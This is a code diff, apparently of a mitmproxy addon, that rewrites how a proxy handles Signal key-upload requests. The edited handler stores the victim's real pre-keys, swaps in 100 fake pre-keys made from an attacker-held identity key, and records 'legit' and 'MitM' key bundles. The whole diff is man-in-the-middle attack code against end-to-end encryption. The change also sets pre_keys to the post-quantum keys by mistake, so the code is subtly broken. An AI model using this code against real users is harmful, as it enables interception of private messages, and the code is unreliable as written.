@@ -12,6 +12,8 @@ from signal_protocol.identity_key import IdentityKey, IdentityKeyPair
 from signal_protocol.curve import PublicKey
 from signal_protocol import helpers, state, kem
 from base64 import b64decode, b64encode
+
+import utils
 from utils import b64enc
 from database import User, Device, LegitBundle, MitMBundle
 from enum import Enum
@@ -190,8 +192,12 @@ def _v1_registration_resp(flow: HTTPFlow):
 def _v2_keys(flow: HTTPFlow):
     identity = flow.request.query["identity"]
 
-    req = json.loads(flow.request.content)
+    from schemas import SetKeysRequest
+    req = utils.json_to_dataclass(SetKeysRequest, flow.request.content)
+    # req = json.loads(flow.request.content)
+    # logging.error(req2)
     ip_addr = flow.client_conn.peername[0]
+
 
     # TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
     if not registration_info.get(ip_addr):
@@ -205,15 +211,20 @@ def _v2_keys(flow: HTTPFlow):
         logging.exception(f"{flow} AND {registration_info}")
         return
 
-    pq_pre_keys = req["pqPreKeys"]
-    pre_keys = req["preKeys"]
+    # pq_pre_keys = req["pqPreKeys"]
+    # pre_keys = req["preKeys"]
+
+    pq_pre_keys = req.pqPreKeys
+    pre_keys = req.pqPreKeys
 
     key_data.pq_pre_keys = pq_pre_keys
     key_data.pre_keys = pre_keys
 
     fake_pre_keys, fake_secret_pre_keys = helpers.create_keys_data(100, alice_identity_key_pair)
 
-    req.update(fake_pre_keys)
+    # fake_pre_keys = utils.json_to_dataclass(SetKeysRequest, fake_pre_keys)
+    # req.update(fake_pre_keys)
+    utils.update_dataclass(req, fake_pre_keys)
 
     key_data.fake_pre_keys = fake_pre_keys["preKeys"]
     key_data.fake_secret_pre_keys = fake_secret_pre_keys["preKeys"]
@@ -246,7 +257,7 @@ def _v2_keys(flow: HTTPFlow):
     legit_bundle.on_conflict_replace().execute()
     mitm_bundle.on_conflict_replace().execute()
 
-    flow.request.content = json.dumps(req).encode()
+    flow.request.content = utils.dataclass_to_json(req).encode()
 
 
 @api.route("/v2/keys/{identifier}/{device_id}", rtype=RouteType.RESPONSE, method=HTTPVerb.GET, allowed_statuses=[200])
